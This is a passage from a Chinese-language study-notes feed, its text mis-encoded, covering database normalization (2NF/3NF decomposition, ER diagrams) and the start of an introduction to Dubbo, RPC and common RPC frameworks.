<td style="text-align:center">é™¢é•¿-1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">å­¦ç”Ÿ-2</td>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">å­¦ç”Ÿ-3</td>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
</tr>
</tbody>
</table>
<p>æœ‰ä»¥ä¸‹å‡½æ•°ä¾èµ–ï¼š</p>
<ul>
<li>Sno -&gt; Sname, Sdept</li>
<li>Sdept -&gt; Mname</li>
</ul>
<p>å…³ç³»-2</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Cname</th>
<th style="text-align:center">Grade</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">è¯¾ç¨‹-1</td>
<td style="text-align:center">90</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">è¯¾ç¨‹-2</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">è¯¾ç¨‹-1</td>
<td style="text-align:center">100</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">è¯¾ç¨‹-2</td>
<td style="text-align:center">95</td>
</tr>
</tbody>
</table>
<p>æœ‰ä»¥ä¸‹å‡½æ•°ä¾èµ–ï¼š</p>
<ul>
<li>Sno, Cname -&gt;  Grade</li>
</ul>
<h3 id="_3-ç¬¬ä¸‰èŒƒå¼-3nf" tabindex="-1"> 3. ç¬¬ä¸‰èŒƒå¼ (3NF)</h3>
<p>éä¸»å±æ€§ä¸ä¼ é€’å‡½æ•°ä¾èµ–äºé”®ç ã€‚</p>
<p>ä¸Šé¢çš„ å…³ç³»-1 ä¸­å­˜åœ¨ä»¥ä¸‹ä¼ é€’å‡½æ•°ä¾èµ–ï¼š</p>
<ul>
<li>Sno -&gt; Sdept -&gt; Mname</li>
</ul>
<p>å¯ä»¥è¿›è¡Œä»¥ä¸‹åˆ†è§£ï¼š</p>
<p>å…³ç³»-11</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Sname</th>
<th style="text-align:center">Sdept</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">å­¦ç”Ÿ-1</td>
<td style="text-align:center">å­¦é™¢-1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">å­¦ç”Ÿ-2</td>
<td style="text-align:center">å­¦é™¢-2</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">å­¦ç”Ÿ-3</td>
<td style="text-align:center">å­¦é™¢-2</td>
</tr>
</tbody>
</table>
<p>å…³ç³»-12</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sdept</th>
<th style="text-align:center">Mname</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">å­¦é™¢-1</td>
<td style="text-align:center">é™¢é•¿-1</td>
</tr>
<tr>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
</tr>
</tbody>
</table>
<h3 id="åˆ¤æ–­" tabindex="-1"> åˆ¤æ–­</h3>
<p>â‘´ åˆ¤æ–­éé”®å±æ€§æ˜¯å¦éƒ¨åˆ†ä¾èµ–äºå€™é€‰é”®ï¼› æ˜¯åˆ™ä¸º1NFï¼Œå¦åˆ™è¿›è¡Œâ‘µï¼›</p>
<p>â‘µ åˆ¤æ–­éé”®å±æ€§æ˜¯å¦ä¼ é€’ä¾èµ–äºå€™é€‰é”®ï¼› æ˜¯åˆ™ä¸º2NFï¼Œå¦åˆ™è¿›è¡Œâ‘¶ï¼›</p>
<p>â‘¶ åˆ¤æ–­æ‰€æœ‰ä¾èµ–ä¸‹å·¦è¾¹æ˜¯å¦å…¨ä¸ºå€™é€‰é”®ï¼› æ˜¯åˆ™ä¸ºBCNFï¼Œå¦åˆ™ä¸º3NFï¼›</p>
<h1 id="å…«ã€er-å›¾" tabindex="-1"> å…«ã€ER å›¾</h1>
<p>Entity-Relationshipï¼Œæœ‰ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼šå®ä½“ã€å±æ€§ã€è”ç³»ã€‚</p>
<p>ç”¨æ¥è¿›è¡Œå…³ç³»å‹æ•°æ®åº“ç³»ç»Ÿçš„æ¦‚å¿µè®¾è®¡ã€‚</p>
<h2 id="å®ä½“çš„ä¸‰ç§è”ç³»" tabindex="-1"> å®ä½“çš„ä¸‰ç§è”ç³»</h2>
<p>åŒ…å«ä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹å¤šä¸‰ç§ã€‚</p>
<ul>
<li>å¦‚æœ A åˆ° B æ˜¯ä¸€å¯¹å¤šå…³ç³»ï¼Œé‚£ä¹ˆç”»ä¸ªå¸¦ç®­å¤´çš„çº¿æ®µæŒ‡å‘ Bï¼›</li>
<li>å¦‚æœæ˜¯ä¸€å¯¹ä¸€ï¼Œç”»ä¸¤ä¸ªå¸¦ç®­å¤´çš„çº¿æ®µï¼›</li>
<li>å¦‚æœæ˜¯å¤šå¯¹å¤šï¼Œç”»ä¸¤ä¸ªä¸å¸¦ç®­å¤´çš„çº¿æ®µã€‚</li>
</ul>
<p>ä¸‹å›¾çš„ Course å’Œ Student æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1d28ad05-39e5-49a2-a6a1-a6f496adba6a.png" width="380px"> </div><br>
<h2 id="è¡¨ç¤ºå‡ºç°å¤šæ¬¡çš„å…³ç³»" tabindex="-1"> è¡¨ç¤ºå‡ºç°å¤šæ¬¡çš„å…³ç³»</h2>
<p>ä¸€ä¸ªå®ä½“åœ¨è”ç³»å‡ºç°å‡ æ¬¡ï¼Œå°±è¦ç”¨å‡ æ¡çº¿è¿æ¥ã€‚</p>
<p>ä¸‹å›¾è¡¨ç¤ºä¸€ä¸ªè¯¾ç¨‹çš„å…ˆä¿®å…³ç³»ï¼Œå…ˆä¿®å…³ç³»å‡ºç°ä¸¤ä¸ª Course å®ä½“ï¼Œç¬¬ä¸€ä¸ªæ˜¯å…ˆä¿®è¯¾ç¨‹ï¼Œåä¸€ä¸ªæ˜¯åä¿®è¯¾ç¨‹ï¼Œå› æ­¤éœ€è¦ç”¨ä¸¤æ¡çº¿æ¥è¡¨ç¤ºè¿™ç§å…³ç³»ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ac929ea3-daca-40ec-9e95-4b2fa6678243.png" width="250px"> </div><br>
<h2 id="è”ç³»çš„å¤šå‘æ€§" tabindex="-1"> è”ç³»çš„å¤šå‘æ€§</h2>
<p>è™½ç„¶è€å¸ˆå¯ä»¥å¼€è®¾å¤šé—¨è¯¾ï¼Œå¹¶ä¸”å¯ä»¥æ•™æˆå¤šåå­¦ç”Ÿï¼Œä½†æ˜¯å¯¹äºç‰¹å®šçš„å­¦ç”Ÿå’Œè¯¾ç¨‹ï¼Œåªæœ‰ä¸€ä¸ªè€å¸ˆæ•™æˆï¼Œè¿™å°±æ„æˆäº†ä¸€ä¸ªä¸‰å…ƒè”ç³»ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5bb1b38a-527e-4802-a385-267dadbd30ba.png" width="350px"> </div><br>
<h2 id="è¡¨ç¤ºå­ç±»" tabindex="-1"> è¡¨ç¤ºå­ç±»</h2>
<p>ç”¨ä¸€ä¸ªä¸‰è§’å½¢å’Œä¸¤æ¡çº¿æ¥è¿æ¥ç±»å’Œå­ç±»ï¼Œä¸å­ç±»æœ‰å…³çš„å±æ€§å’Œè”ç³»éƒ½è¿åˆ°å­ç±»ä¸Šï¼Œè€Œä¸çˆ¶ç±»å’Œå­ç±»éƒ½æœ‰å…³çš„è¿åˆ°çˆ¶ç±»ä¸Šã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/14389ea4-8d96-4e96-9f76-564ca3324c1e.png" width="450px"> </div><br>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, ç­‰. æ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2006.</li>
<li>æ–½ç“¦èŒ¨. é«˜æ€§èƒ½ MYSQL(ç¬¬3ç‰ˆ)[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2013.</li>
<li>å²å˜‰æƒ. æ•°æ®åº“ç³»ç»Ÿæ¦‚è®º[M]. æ¸…åå¤§å­¦å‡ºç‰ˆç¤¾æœ‰é™å…¬å¸, 2006.</li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html" target="_blank" rel="noopener noreferrer">The InnoDB Storage Engine</a></li>
<li><a href="https://www.slideshare.net/ErnestoHernandezRodriguez/transaction-isolation-levels" target="_blank" rel="noopener noreferrer">Transaction isolation levels</a></li>
<li><a href="http://scanftree.com/dbms/2-phase-locking-protocol" target="_blank" rel="noopener noreferrer">Concurrency Control</a></li>
<li><a href="https://www.slideshare.net/brshristov/the-nightmare-of-locking-blocking-and-isolation-levels-46391666" target="_blank" rel="noopener noreferrer">The Nightmare of Locking, Blocking and Isolation Levels!</a></li>
<li><a href="https://aksakalli.github.io/2012/03/12/database-normalization-and-normal-forms-with-an-example.html" target="_blank" rel="noopener noreferrer">Database Normalization and Normal Forms with an Example</a></li>
<li><a href="https://blog.jcole.us/2014/04/16/the-basics-of-the-innodb-undo-logging-and-history-system/" target="_blank" rel="noopener noreferrer">The basics of the InnoDB undo logging and history system</a></li>
<li><a href="https://www.brightbox.com/blog/2013/10/31/on-mysql-locks/" target="_blank" rel="noopener noreferrer">MySQL locking for the busy web developer</a></li>
<li><a href="https://draveness.me/mysql-innodb" target="_blank" rel="noopener noreferrer">æµ…å…¥æµ…å‡º MySQL å’Œ InnoDB</a></li>
<li><a href="https://tech.meituan.com/2014/08/20/innodb-lock.html" target="_blank" rel="noopener noreferrer">Innodb ä¸­çš„äº‹åŠ¡éš”ç¦»çº§åˆ«å’Œé”çš„å…³ç³»</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Dubbo ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Dubbo.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Dubbo.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<h1 id="dubbo-ä»‹ç»" tabindex="-1"> Dubbo ä»‹ç»</h1>
<h2 id="ç®€ä»‹" tabindex="-1"> ç®€ä»‹</h2>
<p>Apache Dubbo (incubating) |ËˆdÊŒbÉ™ÊŠ| æ˜¯ä¸€æ¬¾é«˜æ€§èƒ½ã€è½»é‡çº§çš„å¼€æºJava RPC æ¡†æ¶ï¼Œå®ƒæä¾›äº†ä¸‰å¤§æ ¸å¿ƒèƒ½åŠ›ï¼šé¢å‘æ¥å£çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ™ºèƒ½å®¹é”™å’Œè´Ÿè½½å‡è¡¡ï¼Œä»¥åŠæœåŠ¡è‡ªåŠ¨æ³¨å†Œå’Œå‘ç°ã€‚ç®€å•æ¥è¯´ Dubbo æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶ï¼Œè‡´åŠ›äºæä¾›é«˜æ€§èƒ½å’Œé€æ˜åŒ–çš„RPCè¿œç¨‹æœåŠ¡è°ƒç”¨æ–¹æ¡ˆï¼Œä»¥åŠSOAæœåŠ¡æ²»ç†æ–¹æ¡ˆã€‚</p>
<p>Dubbo ç›®å‰å·²ç»æœ‰æ¥è¿‘ 23k çš„ Star ï¼ŒDubboçš„Github åœ°å€ï¼šhttps://github.com/apache/incubator-dubbo ã€‚ å¦å¤–ï¼Œåœ¨å¼€æºä¸­å›½ä¸¾è¡Œçš„2018å¹´åº¦æœ€å—æ¬¢è¿ä¸­å›½å¼€æºè½¯ä»¶è¿™ä¸ªæ´»åŠ¨çš„è¯„é€‰ä¸­ï¼ŒDubbo æ›´æ˜¯å‡­å€Ÿå…¶è¶…é«˜äººæ°”ä»…æ¬¡äº vue.js å’Œ ECharts è·å¾—ç¬¬ä¸‰åçš„å¥½æˆç»©ã€‚</p>
<p>Dubbo æ˜¯ç”±é˜¿é‡Œå¼€æºï¼Œåæ¥åŠ å…¥äº† Apache ã€‚æ­£å¼ç”±äº Dubbo çš„å‡ºç°ï¼Œæ‰ä½¿å¾—è¶Šæ¥è¶Šå¤šçš„å…¬å¸å¼€å§‹ä½¿ç”¨ä»¥åŠæ¥å—åˆ†å¸ƒå¼æ¶æ„ã€‚</p>
<h2 id="rpc" tabindex="-1"> RPC</h2>
<p>RPCï¼ˆRemote Procedure Callï¼‰ï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼Œå®ƒæ˜¯ä¸€ç§é€šè¿‡ç½‘ç»œä»è¿œç¨‹è®¡ç®—æœºç¨‹åºä¸Šè¯·æ±‚æœåŠ¡ï¼Œè€Œä¸éœ€è¦äº†è§£åº•å±‚ç½‘ç»œæŠ€æœ¯çš„åè®®ã€‚RPCåè®®å‡å®šæŸäº›ä¼ è¾“åè®®çš„å­˜åœ¨ï¼Œå¦‚TCPæˆ–UDPï¼Œä¸ºé€šä¿¡ç¨‹åºä¹‹é—´æºå¸¦ä¿¡æ¯æ•°æ®ã€‚åœ¨OSIç½‘ç»œé€šä¿¡æ¨¡å‹ä¸­ï¼ŒRPCè·¨è¶Šäº†ä¼ è¾“å±‚å’Œåº”ç”¨å±‚ã€‚RPCä½¿å¾—å¼€å‘åŒ…æ‹¬ç½‘ç»œåˆ†å¸ƒå¼å¤šç¨‹åºåœ¨å†…çš„åº”ç”¨ç¨‹åºæ›´åŠ å®¹æ˜“ã€‚</p>
<p>RPCé‡‡ç”¨å®¢æˆ·æœº/æœåŠ¡å™¨æ¨¡å¼ã€‚è¯·æ±‚ç¨‹åºå°±æ˜¯ä¸€ä¸ªå®¢æˆ·æœºï¼Œè€ŒæœåŠ¡æä¾›ç¨‹åºå°±æ˜¯ä¸€ä¸ªæœåŠ¡å™¨ã€‚é¦–å…ˆï¼Œå®¢æˆ·æœºè°ƒç”¨è¿›ç¨‹å‘é€ä¸€ä¸ªæœ‰è¿›ç¨‹å‚æ•°çš„è°ƒç”¨ä¿¡æ¯åˆ°æœåŠ¡è¿›ç¨‹ï¼Œç„¶åç­‰å¾…åº”ç­”ä¿¡æ¯ã€‚åœ¨æœåŠ¡å™¨ç«¯ï¼Œè¿›ç¨‹ä¿æŒç¡çœ çŠ¶æ€ç›´åˆ°è°ƒç”¨ä¿¡æ¯åˆ°è¾¾ä¸ºæ­¢ã€‚å½“ä¸€ä¸ªè°ƒç”¨ä¿¡æ¯åˆ°è¾¾ï¼ŒæœåŠ¡å™¨è·å¾—è¿›ç¨‹å‚æ•°ï¼Œè®¡ç®—ç»“æœï¼Œå‘é€ç­”å¤ä¿¡æ¯ï¼Œç„¶åç­‰å¾…ä¸‹ä¸€ä¸ªè°ƒç”¨ä¿¡æ¯ï¼Œæœ€åï¼Œå®¢æˆ·ç«¯è°ƒç”¨è¿›ç¨‹æ¥æ”¶ç­”å¤ä¿¡æ¯ï¼Œè·å¾—è¿›ç¨‹ç»“æœï¼Œç„¶åè°ƒç”¨æ‰§è¡Œç»§ç»­è¿›è¡Œã€‚</p>
<p>æ¯”å¦‚ä¸¤ä¸ªä¸åŒçš„æœåŠ¡ Aã€B éƒ¨ç½²åœ¨ä¸¤å°ä¸åŒçš„æœºå™¨ä¸Šï¼Œé‚£ä¹ˆæœåŠ¡ A å¦‚æœæƒ³è¦è°ƒç”¨æœåŠ¡ B ä¸­çš„æŸä¸ªæ–¹æ³•è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿä½¿ç”¨ HTTPè¯·æ±‚ å½“ç„¶å¯ä»¥ï¼Œä½†æ˜¯å¯èƒ½ä¼šæ¯”è¾ƒæ…¢è€Œä¸”ä¸€äº›ä¼˜åŒ–åšçš„å¹¶ä¸å¥½ã€‚ RPC çš„å‡ºç°å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>RPC ä¸»è¦è§£å†³äº†ï¼š<strong>è®©åˆ†å¸ƒå¼æˆ–è€…å¾®æœåŠ¡ç³»ç»Ÿä¸­ä¸åŒæœåŠ¡ä¹‹é—´çš„è°ƒç”¨åƒæœ¬åœ°è°ƒç”¨ä¸€æ ·ç®€å•ã€‚</strong></p>
<p><img src="@source/assets/cs-note/framework/dubbo/rpc.png" alt="RPCåŸç†å›¾" loading="lazy"></p>
<ol>
<li>æœåŠ¡æ¶ˆè´¹æ–¹ï¼ˆclientï¼‰è°ƒç”¨ä»¥æœ¬åœ°è°ƒç”¨æ–¹å¼è°ƒç”¨æœåŠ¡ï¼›</li>
<li>client stubæ¥æ”¶åˆ°è°ƒç”¨åè´Ÿè´£å°†æ–¹æ³•ã€å‚æ•°ç­‰ç»„è£…æˆèƒ½å¤Ÿè¿›è¡Œç½‘ç»œä¼ è¾“çš„æ¶ˆæ¯ä½“ï¼›</li>
<li>client stubæ‰¾åˆ°æœåŠ¡åœ°å€ï¼Œå¹¶å°†æ¶ˆæ¯å‘é€åˆ°æœåŠ¡ç«¯ï¼›</li>
<li>server stubæ”¶åˆ°æ¶ˆæ¯åè¿›è¡Œè§£ç ï¼›</li>
<li>server stubæ ¹æ®è§£ç ç»“æœè°ƒç”¨æœ¬åœ°çš„æœåŠ¡ï¼›</li>
<li>æœ¬åœ°æœåŠ¡æ‰§è¡Œå¹¶å°†ç»“æœè¿”å›ç»™server stubï¼›</li>
<li>server stubå°†è¿”å›ç»“æœæ‰“åŒ…æˆæ¶ˆæ¯å¹¶å‘é€è‡³æ¶ˆè´¹æ–¹ï¼›</li>
<li>client stubæ¥æ”¶åˆ°æ¶ˆæ¯ï¼Œå¹¶è¿›è¡Œè§£ç ï¼›</li>
<li>æœåŠ¡æ¶ˆè´¹æ–¹å¾—åˆ°æœ€ç»ˆç»“æœã€‚</li>
</ol>
<p><img src="@source/assets/cs-note/framework/dubbo/RPCåŸç†æ—¶åº.png" alt="RPCåŸç†æ—¶åºå›¾" loading="lazy"></p>
<h3 id="å¸¸è§çš„-rpc-æ¡†æ¶" tabindex="-1"> å¸¸è§çš„ RPC æ¡†æ¶</h3>
<ul>
<li>
<p><strong>RMIï¼ˆJDKè‡ªå¸¦ï¼‰ï¼š</strong> JDKè‡ªå¸¦çš„RPCï¼Œæœ‰å¾ˆå¤šå±€é™æ€§ï¼Œä¸æ¨èä½¿ç”¨ã€‚</p>
</li>
<li>
<p><strong>Dubbo:</strong> Dubboæ˜¯ é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€ä¸ªé«˜æ€§èƒ½ä¼˜ç§€çš„æœåŠ¡æ¡†æ¶ï¼Œä½¿å¾—åº”ç”¨å¯é€šè¿‡é«˜æ€§èƒ½çš„ RPC å®ç°æœåŠ¡çš„è¾“å‡ºå’Œè¾“å…¥åŠŸèƒ½ï¼Œå¯ä»¥å’Œ Springæ¡†æ¶æ— ç¼é›†æˆã€‚ç›®å‰ Dubbo å·²ç»æˆä¸º Spring Cloud Alibaba ä¸­çš„å®˜æ–¹ç»„ä»¶ã€‚</p>
</li>
<li>
<p><strong>gRPC</strong> ï¼šgRPCæ˜¯å¯ä»¥åœ¨ä»»ä½•ç¯å¢ƒä¸­è¿è¡Œçš„ç°ä»£å¼€æºé«˜æ€§èƒ½RPCæ¡†æ¶ã€‚å®ƒå¯ä»¥é€šè¿‡å¯æ’æ‹”çš„æ”¯æŒæ¥æœ‰æ•ˆåœ°è¿æ¥æ•°æ®ä¸­å¿ƒå†…å’Œè·¨æ•°æ®ä¸­å¿ƒçš„æœåŠ¡ï¼Œä»¥å®ç°è´Ÿè½½å¹³è¡¡ï¼Œè·Ÿè¸ªï¼Œè¿è¡ŒçŠ¶å†µæ£€æŸ¥å’Œèº«ä»½éªŒè¯ã€‚å®ƒä¹Ÿé€‚ç”¨äºåˆ†å¸ƒå¼è®¡ç®—çš„æœ€åä¸€è‹±é‡Œï¼Œä»¥å°†è®¾å¤‡ï¼Œç§»åŠ¨åº”ç”¨ç¨‹åºå’Œæµè§ˆå™¨è¿æ¥åˆ°åç«¯æœåŠ¡ã€‚</p>
</li>
<li>
<p><strong>Hessianï¼š</strong> Hessianæ˜¯ä¸€ä¸ªè½»é‡çº§çš„remotingonhttpå·¥å…·ï¼Œä½¿ç”¨ç®€å•çš„æ–¹æ³•æä¾›äº†RMIçš„åŠŸèƒ½ã€‚ ç›¸æ¯”WebServiceï¼ŒHessianæ›´ç®€å•ã€å¿«æ·ã€‚é‡‡ç”¨çš„æ˜¯äºŒè¿›åˆ¶RPCåè®®ï¼Œå› ä¸ºé‡‡ç”¨çš„æ˜¯äºŒè¿›åˆ¶åè®®ï¼Œæ‰€ä»¥å®ƒå¾ˆé€‚åˆäºå‘é€äºŒè¿›åˆ¶æ•°æ®ã€‚</p>
</li>
<li>
<p><strong>Thriftï¼š</strong>  Apache Thriftæ˜¯Facebookå¼€æºçš„è·¨è¯­è¨€çš„RPCé€šä¿¡æ¡†æ¶ï¼Œç›®å‰å·²ç»æçŒ®ç»™ApacheåŸºé‡‘ä¼šç®¡ç†ï¼Œç”±äºå…¶è·¨è¯­è¨€ç‰¹æ€§å’Œå‡ºè‰²çš„æ€§èƒ½ï¼Œåœ¨å¾ˆå¤šäº’è”ç½‘å…¬å¸å¾—åˆ°åº”ç”¨ï¼Œæœ‰èƒ½åŠ›çš„å…¬å¸ç”šè‡³ä¼šåŸºäºthriftç ”å‘ä¸€å¥—åˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶ï¼Œå¢åŠ è¯¸å¦‚æœåŠ¡æ³¨å†Œã€æœåŠ¡å‘ç°ç­‰åŠŸèƒ½ã€‚</p>
</li>
</ul>
<p>å¦‚ä½•è¿›è¡Œé€‰æ‹©ï¼Ÿ</p>
<ul>
<li><strong>æ˜¯å¦å…è®¸ä»£ç ä¾µå…¥ï¼š</strong>  å³éœ€è¦ä¾èµ–ç›¸åº”çš„ä»£ç ç”Ÿæˆå™¨ç”Ÿæˆä»£ç ï¼Œæ¯”å¦‚Thriftã€‚</li>
<li><strong>æ˜¯å¦éœ€è¦é•¿è¿æ¥è·å–é«˜æ€§èƒ½ï¼š</strong>  å¦‚æœå¯¹äºæ€§èƒ½éœ€æ±‚è¾ƒé«˜çš„haulï¼Œé‚£ä¹ˆå¯ä»¥æœæ–­é€‰æ‹©åŸºäºTCPçš„Thriftã€Dubboã€‚</li>
<li><strong>æ˜¯å¦éœ€è¦è·¨è¶Šç½‘æ®µã€è·¨è¶Šé˜²ç«å¢™ï¼š</strong> è¿™ç§æƒ…å†µä¸€èˆ¬é€‰æ‹©åŸºäºHTTPåè®®çš„Hessianå’ŒThriftçš„HTTP Transportã€‚</li>
</ul>
<p>æ­¤å¤–ï¼ŒGoogleæ¨å‡ºçš„åŸºäºHTTP2.0çš„gRPCæ¡†æ¶ä¹Ÿå¼€å§‹å¾—åˆ°åº”ç”¨ï¼Œå…¶åºåˆ—åŒ–åè®®åŸºäºProtobufï¼Œç½‘ç»œæ¡†æ¶ä½¿ç”¨çš„æ˜¯Netty4,ä½†æ˜¯å…¶éœ€è¦ç”Ÿæˆä»£ç ï¼Œå¯æ‰©å±•æ€§ä¹Ÿæ¯”è¾ƒå·®ã€‚</p>
<h3 id="rpc-http" tabindex="-1"> RPC HTTP</h3>
<p>RPC åªæ˜¯ä¸€ç§æ¦‚å¿µã€ä¸€ç§è®¾è®¡ï¼Œå°±æ˜¯ä¸ºäº†è§£å†³ <strong>ä¸åŒæœåŠ¡ä¹‹é—´çš„è°ƒç”¨é—®é¢˜</strong>, å®ƒä¸€èˆ¬ä¼šåŒ…å«æœ‰ <strong>ä¼ è¾“åè®®</strong> å’Œ <strong>åºåˆ—åŒ–åè®®</strong> è¿™ä¸¤ä¸ªã€‚</p>
<p>å®ç° RPC çš„å¯ä»¥ä¼ è¾“åè®®å¯ä»¥ç›´æ¥å»ºç«‹åœ¨ TCP ä¹‹ä¸Šï¼Œä¹Ÿå¯ä»¥å»ºç«‹åœ¨ HTTP åè®®ä¹‹ä¸Šã€‚å¤§éƒ¨åˆ† RPC æ¡†æ¶éƒ½æ˜¯ä½¿ç”¨çš„ TCP è¿æ¥ï¼ˆgRPCä½¿ç”¨äº†HTTP2ï¼‰ã€‚</p>
<p>ä¸»è¦å…³é”®å°±åœ¨ HTTP ä½¿ç”¨çš„ TCP åè®®ï¼Œå’Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ TCP åè®®åœ¨æŠ¥æ–‡ä¸Šçš„åŒºåˆ«ã€‚</p>
<p>http1.1åè®®çš„ TCP æŠ¥æ–‡åŒ…å«å¤ªå¤šåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å¯èƒ½æ— ç”¨çš„ä¿¡æ¯ï¼›</p>
<blockquote>
<p>é¦–å…ˆè¦å¦è®¤ä¸€ç‚¹ HTTP åè®®ç›¸è¾ƒäºè‡ªå®šä¹‰ TCP æŠ¥æ–‡åè®®ï¼Œå¢åŠ çš„å¼€é”€åœ¨äºè¿æ¥çš„å»ºç«‹ä¸æ–­å¼€ã€‚HTTP åè®®æ˜¯æ”¯æŒè¿æ¥æ± å¤ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯å»ºç«‹ä¸€å®šæ•°é‡çš„è¿æ¥ä¸æ–­å¼€ï¼Œå¹¶ä¸ä¼šé¢‘ç¹çš„åˆ›å»ºå’Œé”€æ¯è¿æ¥ã€‚äºŒè¦è¯´çš„æ˜¯ HTTP ä¹Ÿå¯ä»¥ä½¿ç”¨ Protobuf è¿™ç§äºŒè¿›åˆ¶ç¼–ç åè®®å¯¹å†…å®¹è¿›è¡Œç¼–ç ï¼Œå› æ­¤äºŒè€…æœ€å¤§çš„åŒºåˆ«è¿˜æ˜¯åœ¨ä¼ è¾“åè®®ä¸Šã€‚</p>
</blockquote>
<p><strong>ä½¿ç”¨è‡ªå®šä¹‰ TCP åè®®è¿›è¡Œä¼ è¾“å°±ä¼šé¿å…ä¸Šé¢è¿™ä¸ªé—®é¢˜ï¼Œæå¤§åœ°å‡è½»äº†ä¼ è¾“æ•°æ®çš„å¼€é”€ã€‚</strong>
è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆé€šå¸¸ä¼šé‡‡ç”¨è‡ªå®šä¹‰ TCP åè®®çš„ RPCæ¥è¿›è¡Œè¿›è¡ŒæœåŠ¡è°ƒç”¨çš„çœŸæ­£åŸå› ã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œæˆç†Ÿçš„ RPCæ¡†æ¶è¿˜æä¾›å¥½äº†â€œæœåŠ¡è‡ªåŠ¨æ³¨å†Œä¸å‘ç°â€ã€&quot;æ™ºèƒ½è´Ÿè½½å‡è¡¡&quot;ã€â€œå¯è§†åŒ–çš„æœåŠ¡æ²»ç†å’Œè¿ç»´â€ã€â€œè¿è¡ŒæœŸæµé‡è°ƒåº¦â€ç­‰ç­‰åŠŸèƒ½ï¼Œè¿™äº›ä¹Ÿç®—æ˜¯é€‰æ‹©RPC è¿›è¡ŒæœåŠ¡æ³¨å†Œå’Œå‘ç°çš„ä¸€æ–¹é¢åŸå› å§ï¼</p>
<h2 id="dubbo-çš„äº§ç”Ÿ" tabindex="-1"> Dubbo çš„äº§ç”Ÿ</h2>
